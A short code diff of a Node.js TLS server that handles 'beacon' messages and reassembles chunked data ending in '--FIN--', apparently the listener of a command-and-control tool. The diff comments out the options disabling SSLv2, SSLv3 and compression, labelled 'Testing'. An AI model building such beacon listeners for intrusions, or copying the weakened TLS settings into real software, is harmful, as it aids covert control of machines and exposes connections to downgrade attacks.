@@ -49,7 +49,8 @@ const server = tls.createServer({
     ciphers: config.channels.tls.ciphers,
     honorCipherOrder: true,
     minVersion: config.channels.tls.version, // Minimum TLS version
-    secureOptions: constants.SSL_OP_NO_SSLv2 | constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_COMPRESSION // Disable SSLv2, SSLv3, and compression
+    // Testing
+    //secureOptions: constants.SSL_OP_NO_SSLv2 | constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_COMPRESSION // Disable SSLv2, SSLv3, and compression
 }, (socket) => {
     const clientAddress = socket.remoteAddress || '1';
     const sessionId = getSessionId(clientAddress);
@@ -62,7 +63,6 @@ const server = tls.createServer({
 
     socket.on('data', async (chunk) => {
         const payloadStr = chunk.toString('utf8');
-        console.log(payloadStr);
         try {
             const response = (JSON.parse(payloadStr)).response;
             if (response.beacon) {
@@ -75,7 +75,6 @@ const server = tls.createServer({
             } else {
                 await handleResponse(response);
             }
-
         } catch (e) {
             try {
                 if (payloadStr.length >= config.data.chunk_size || payloadStr.includes('--FIN--')) {
